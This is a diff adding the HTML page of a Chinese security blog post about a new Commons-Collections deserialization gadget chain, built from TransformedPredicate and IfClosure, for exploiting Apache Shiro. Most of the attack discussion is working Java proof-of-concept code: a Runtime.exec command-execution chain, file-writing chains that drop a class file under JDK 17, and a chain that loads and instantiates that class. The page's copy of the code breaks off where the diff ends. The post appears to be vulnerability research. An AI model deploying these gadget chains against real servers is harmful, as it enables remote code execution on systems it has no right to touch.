@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Commons-Collections中Closure和Predicate在Shiro下的利用 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="发现了一条新的CC链子可以实现链式调用，并可以用于Shiro反序列化。">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="Commons-Collections中Closure和Predicate在Shiro下的利用">
+  <meta property="og:description" content="发现了一条新的CC链子可以实现链式调用，并可以用于Shiro反序列化。">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-14T13:57:11+00:00">
+    <meta property="article:modified_time" content="2025-05-14T13:57:11+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Commons-Collections中Closure和Predicate在Shiro下的利用">
+<meta name="twitter:description" content="发现了一条新的CC链子可以实现链式调用，并可以用于Shiro反序列化。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Commons-Collections中Closure和Predicate在Shiro下的利用",
+      "item": "https://zoiltin.github.io/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Commons-Collections中Closure和Predicate在Shiro下的利用",
+  "name": "Commons-Collections中Closure和Predicate在Shiro下的利用",
+  "description": "发现了一条新的CC链子可以实现链式调用，并可以用于Shiro反序列化。",
+  "keywords": [
+    
+  ],
+  "articleBody": "本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\nClosure和Predicate CC反序列化常见的打法有两种：\n通过ChainedTransformer链式调用Runtime的exec方法。 直接调用TemplatesImpl加载字节码，这样不需要链式调用 ClosureTransformer类可以调用Closure，其transform方法代码如下：\npublic Object transform(Object input) { iClosure.execute(input); return input; } 可以调用任意Closure类的execute方法。\nIfClosure类的execute方法代码如下：\npublic void execute(Object input) { if (iPredicate.evaluate(input) == true) { iTrueClosure.execute(input); } else { iFalseClosure.execute(input); } } 会调用任意Predicate类的evaluate方法，且参数可控。\nTransformedPredicate是Predicate接口的一个实现类，其evaluate方法可以链式调用：\npublic boolean evaluate(Object object) { Object result = iTransformer.transform(object); return iPredicate.evaluate(result); } 当前iTransformer的transform方法执行后会将结果作为参数传递给下一个Predicate。将多个TransformedPredicate串起来即可实现链式调用，可以替代ChainedTransformer\n命令执行 在Shiro反序列化漏洞中，由于使用特殊的ClassResolvingObjectInputStream类来加载类，会有一些限制：如果反序列化流中包含非 Java 自身的数组(非String[], byte[]等)，则会出现无法加载类的错误。\n常见的绕过方式为：\n让InvokerTransformer直接调用TemplatesImpl的newTransformer方法，不使用Transformer数组，jdk高版本不能使用。 使用RMI二次反序列化，需要出网。 但使用Predicate不会受到数组限制，因为Predicate是通过一个个引用实现链式调用的。\n执行Runtime#exec的POC：\nPredicate predicate4 = new TransformedPredicate( new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), null ); Predicate predicate3 = new TransformedPredicate( new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}), predicate4 ); Predicate predicate2 = new TransformedPredicate( new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[]{}}), predicate3 ); Predicate predicate1 = new TransformedPredicate( new ConstantTransformer(Runtime.class), predicate2 ); final Closure closure = new IfClosure(predicate1, null, null); final Transformer transformer = new ClosureTransformer(closure); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(\"foo\"); HashMap innimpl = (HashMap) getFieldValue(map, \"map\"); if (innimpl == null){ innimpl = (HashMap) getFieldValue(map, \"backingMap\"); } Object[] array = (Object[]) getFieldValue(innimpl, \"table\"); if (array == null){ array = (Object[]) getFieldValue(innimpl, \"elementData\"); } Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\"key\"); } catch(Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); System.out.println(ser(map)); 高版本加载字节码 JDK 17.0.10\nCC 3.2.1\n对于低版本来说，直接用InstantiateTransformer和TrAXFilter触发TemplatesImpl的newTransformer方法即可，但对于jdk17+来说，用TemplatesImpl会受到module限制，而默认js引擎已经被移除了，但还可以用URLClassLoader，不过会有文件落地或者网络连接。\nFileOutputStream fileOutputStream = new FileOutputStream(\"/uploadpath/Test.class\"); fileOutputStream.write(new byte[]{1,2,3}); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"file:///uploadpath/\")}); Class calc = urlClassLoader.loadClass(\"Test\"); calc.newInstance(); 写文件 POC：\nClass InstantiateTransformerClass = Class.forName(\"org.apache.commons.collections.functors.InstantiateTransformer\"); Constructor InstantiateTransformerCon = InstantiateTransformerClass.getDeclaredConstructor(new Class[]{Class[].class, Object[].class}); InstantiateTransformerCon.setAccessible(true); Predicate predicate3 = new TransformedPredicate( new InvokerTransformer(\"write\", new Class[]{byte[].class}, new Object[]{code}), null ); Predicate predicate2 = new TransformedPredicate( (Transformer) InstantiateTransformerCon.newInstance(new Class[]{String.class}, new Object[]{\"/uploadpath/Test.class\"}), predicate3 ); Predicate predicate1 = new TransformedPredicate( new ConstantTransformer(FileOutputStream.class), predicate2 ); 上面的POC没有执行close方法，虽然后续可以正常加载字节码，但在windows系统上没办法删除，在Linux上也留着fd，不够隐蔽。\n如果要执行close方法的话执行流程就不是纯线性的了，不过好在IfClosure支持对同一个对象执行多条分支Closure\npublic void execute(Object input) { if (iPredicate.evaluate(input) == true) { iTrueClosure.execute(input); } else { iFalseClosure.execute(input); } } 可以先通过InstantiateTransformer获得一个FileOutputStream对象赋值为input变量，然后进入IfClosure通过TransformedPredicate的evaluate执行write方法，最后进入else分支通过iFalseClosure执行close方法。流程图如下：\nif表达式里的iPredicate对应predicate_main\nPOC:\nClass InstantiateTransformerClass = Class.forName(\"org.apache.commons.collections.functors.InstantiateTransformer\"); Constructor InstantiateTransformerCon = InstantiateTransformerClass.getDeclaredConstructor(new Class[]{Class[].class, Object[].class}); InstantiateTransformerCon.setAccessible(true); Predicate predicate_main = new TransformedPredicate( new InvokerTransformer(\"write\", new Class[]{byte[].class}, new Object[]{code}), FalsePredicate.getInstance() ); Closure branch_false_closure = new IfClosure( new TransformedPredicate( new InvokerTransformer(\"close\", new Class[]{}, new Object[]{}), null ), null, null ); Predicate predicate3 = new TransformedPredicate( new ClosureTransformer(new IfClosure(predicate_main, null, branch_false_closure)), FalsePredicate.getInstance() ); Predicate predicate2 = new TransformedPredicate( (Transformer) InstantiateTransformerCon.newInstance(new Class[]{String.class}, new Object[]{\"/uploadpath/Test.class\"}), predicate3 ); Predicate predicate1 = new TransformedPredicate( new ConstantTransformer(FileOutputStream.class), predicate2 ); 本来想试试用FileOutputStream指定append参数为true，这样可以文件追加，但解析boolean类时会进入Shiro的ClassResolvingObjectInputStream类自定义的resolveClass方法，用的是ClassUtils#forName方法。\n然后会报错找不到这个类，跟上面说的无法解析非Java数组应该是类似的原因。\n而原生的resolveClass方法代码有一个专门的map存放这些类：\n所以int.class，boolean.class等都不能反序列化，这种情况下就没办法追加写入了。\n加载类 Class InstantiateTransformerClass = Class.forName(\"org.apache.commons.collections.functors.InstantiateTransformer\"); Constructor InstantiateTransformerCon = InstantiateTransformerClass.getDeclaredConstructor(new Class[]{Class[].class, Object[].class}); InstantiateTransformerCon.setAccessible(true); Predicate predicate4 = new TransformedPredicate( new InvokerTransformer(\"newInstance\", new Class[]{}, new Object[]{}), null ); Predicate predicate3 = new TransformedPredicate( new InvokerTransformer(\"loadClass\", new Class[]{String.class}, new Object[]{\"Test\"}), predicate4 ); Predicate predicate2 = new TransformedPredicate( (Transformer) InstantiateTransformerCon.newInstance(new Class[]{URL[].class}, new Object[]{new URL[]{new URL(\"file:///uploadpath/\")}}), predicate3 ); Predicate predicate1 = new TransformedPredicate( new ConstantTransformer(URLClassLoader.class), predicate2 ); 通过不同的Closure配合可以执行复杂的操作，但这个方法有一个缺点，那就是参数不能变，InvokeTransformer和InstantiateTransformer中的iArgs都是提前设置的，所以像defineClass这种需要把ClassLoader对象作为参数的方法就不能执行了。\n",
+  "wordCount" : "449",
+  "inLanguage": "en",
+  "datePublished": "2025-05-14T13:57:11Z",
+  "dateModified": "2025-05-14T13:57:11Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/commons-collections%E4%B8%ADclosure%E5%92%8Cpredicate%E5%9C%A8shiro%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Commons-Collections中Closure和Predicate在Shiro下的利用
+    </h1>
+    <div class="post-description">
+      发现了一条新的CC链子可以实现链式调用，并可以用于Shiro反序列化。
+    </div>
+    <div class="post-meta"><span title='2025-05-14 13:57:11 +0000 UTC'>May 14, 2025</span>&nbsp;·&nbsp;3 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#closure%e5%92%8cpredicate" aria-label="Closure和Predicate">Closure和Predicate</a></li>
+                <li>
+                    <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="命令执行">命令执行</a></li>
+                <li>
+                    <a href="#%e9%ab%98%e7%89%88%e6%9c%ac%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" aria-label="高版本加载字节码">高版本加载字节码</a><ul>
+                        
+                <li>
+                    <a href="#%e5%86%99%e6%96%87%e4%bb%b6" aria-label="写文件">写文件</a></li>
+                <li>
+                    <a href="#%e5%8a%a0%e8%bd%bd%e7%b1%bb" aria-label="加载类">加载类</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。</strong></p>
+<h1 id="closure和predicate">Closure和Predicate<a hidden class="anchor" aria-hidden="true" href="#closure和predicate">#</a></h1>
+<p>CC反序列化常见的打法有两种：</p>
+<ol>
+<li>通过ChainedTransformer链式调用<code>Runtime</code>的<code>exec</code>方法。</li>
+<li>直接调用<code>TemplatesImpl</code>加载字节码，这样不需要链式调用</li>
+</ol>
+<p><code>ClosureTransformer</code>类可以调用<code>Closure</code>，其<code>transform</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">transform</span>(Object input) {
+</span></span><span style="display:flex;"><span>    iClosure.<span style="color:#a6e22e">execute</span>(input);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> input;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以调用任意<code>Closure</code>类的<code>execute</code>方法。</p>
+<p><code>IfClosure</code>类的<code>execute</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute</span>(Object input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iPredicate.<span style="color:#a6e22e">evaluate</span>(input) <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        iTrueClosure.<span style="color:#a6e22e">execute</span>(input);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        iFalseClosure.<span style="color:#a6e22e">execute</span>(input);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>会调用任意<code>Predicate</code>类的<code>evaluate</code>方法，且参数可控。</p>
+<p><code>TransformedPredicate</code>是<code>Predicate</code>接口的一个实现类，其<code>evaluate</code>方法可以链式调用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">evaluate</span>(Object object) {
+</span></span><span style="display:flex;"><span>    Object result <span style="color:#f92672">=</span> iTransformer.<span style="color:#a6e22e">transform</span>(object);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> iPredicate.<span style="color:#a6e22e">evaluate</span>(result);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>当前<code>iTransformer</code>的<code>transform</code>方法执行后会将结果作为参数传递给下一个<code>Predicate</code>。将多个<code>TransformedPredicate</code>串起来即可实现链式调用，可以替代<code>ChainedTransformer</code></p>
+<h1 id="命令执行">命令执行<a hidden class="anchor" aria-hidden="true" href="#命令执行">#</a></h1>
+<p>在Shiro反序列化漏洞中，由于使用特殊的<code>ClassResolvingObjectInputStream</code>类来加载类，会有一些限制：<strong>如果反序列化流中包含非 Java 自身的数组(非String[], byte[]等)，则会出现无法加载类的错误。</strong></p>
+<p>常见的绕过方式为：</p>
+<ol>
+<li>让<code>InvokerTransformer</code>直接调用<code>TemplatesImpl</code>的<code>newTransformer</code>方法，不使用Transformer数组，jdk高版本不能使用。</li>
+<li>使用RMI二次反序列化，需要出网。</li>
+</ol>
+<p>但使用<code>Predicate</code>不会受到数组限制，因为<code>Predicate</code>是通过一个个引用实现链式调用的。</p>
+<p>执行<code>Runtime#exec</code>的POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Predicate predicate4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>}),
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{}}),
+</span></span><span style="display:flex;"><span>        predicate4
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}}),
+</span></span><span style="display:flex;"><span>        predicate3
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>        predicate2
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Closure closure <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> IfClosure(predicate1, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ClosureTransformer(closure);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HashSet map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(1);
+</span></span><span style="display:flex;"><span>map.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HashMap innimpl <span style="color:#f92672">=</span> (HashMap) getFieldValue(map, <span style="color:#e6db74">&#34;map&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (innimpl <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>    innimpl <span style="color:#f92672">=</span> (HashMap) getFieldValue(map, <span style="color:#e6db74">&#34;backingMap&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(innimpl, <span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (array <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>    array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(innimpl, <span style="color:#e6db74">&#34;elementData&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>    node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Field keyField <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>    keyField <span style="color:#f92672">=</span> node.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;key&#34;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span>(Exception e) {
+</span></span><span style="display:flex;"><span>    keyField <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.MapEntry&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;key&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>keyField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>keyField.<span style="color:#a6e22e">set</span>(node, entry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(ser(map));
+</span></span></code></pre></div><h1 id="高版本加载字节码">高版本加载字节码<a hidden class="anchor" aria-hidden="true" href="#高版本加载字节码">#</a></h1>
+<blockquote>
+<p>JDK 17.0.10</p>
+<p>CC 3.2.1</p>
+</blockquote>
+<p>对于低版本来说，直接用<code>InstantiateTransformer</code>和<code>TrAXFilter</code>触发<code>TemplatesImpl</code>的<code>newTransformer</code>方法即可，但对于jdk17+来说，用TemplatesImpl会受到module限制，而默认js引擎已经被移除了，但还可以用<code>URLClassLoader</code>，不过会有文件落地或者网络连接。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>FileOutputStream fileOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;/uploadpath/Test.class&#34;</span>);
+</span></span><span style="display:flex;"><span>fileOutputStream.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>{1,2,3});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URLClassLoader urlClassLoader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URLClassLoader(<span style="color:#66d9ef">new</span> URL<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;file:///uploadpath/&#34;</span>)});
+</span></span><span style="display:flex;"><span>Class calc <span style="color:#f92672">=</span> urlClassLoader.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;Test&#34;</span>);
+</span></span><span style="display:flex;"><span>calc.<span style="color:#a6e22e">newInstance</span>();
+</span></span></code></pre></div><h2 id="写文件">写文件<a hidden class="anchor" aria-hidden="true" href="#写文件">#</a></h2>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class InstantiateTransformerClass <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.apache.commons.collections.functors.InstantiateTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>Constructor InstantiateTransformerCon <span style="color:#f92672">=</span> InstantiateTransformerClass.<span style="color:#a6e22e">getDeclaredConstructor</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>InstantiateTransformerCon.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Predicate predicate3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformedPredicate(
